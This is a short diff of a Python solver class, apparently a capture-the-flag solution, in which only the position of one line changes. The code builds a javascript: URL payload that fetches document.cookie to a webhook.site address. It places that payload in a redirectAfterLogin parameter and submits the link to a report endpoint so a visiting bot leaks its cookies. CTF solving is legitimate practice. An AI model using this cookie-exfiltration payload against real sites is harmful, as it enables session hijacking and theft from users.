@@ -15,8 +15,8 @@ class Solver:
 
         PAYLOAD = f"javascript:fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)"
         encoded_payload = urllib.parse.quote(PAYLOAD)
-        report_url = f"{BASE_URL}/find-logged-in-page?redirectAfterLogin={encoded_payload}"
 
+        report_url = f"{BASE_URL}/find-logged-in-page?redirectAfterLogin={encoded_payload}"
         self.session.post(f"{BASE_URL}/report", data={"url": report_url})
         self.webhooksite.find_flags()
 
